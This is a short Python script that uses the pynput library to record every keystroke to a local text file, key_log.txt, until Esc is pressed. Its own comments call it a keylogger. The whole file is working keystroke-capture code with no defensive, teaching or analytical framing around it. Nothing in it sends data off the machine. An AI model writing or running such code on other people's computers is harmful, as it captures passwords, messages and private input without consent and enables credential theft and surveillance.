from pynput import keyboard

# File to save the keystrokes
log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as file:
            # Write the key that was pressed
            if hasattr(key, 'char') and key.char is not None:
                file.write(key.char)
            else:
                file.write(f"[{key}]")  # Special keys (e.g., Enter, Shift)
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    # Stop the keylogger when Esc is pressed
    if key == keyboard.Key.esc:
        return False

# Start listening to the keyboard
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
    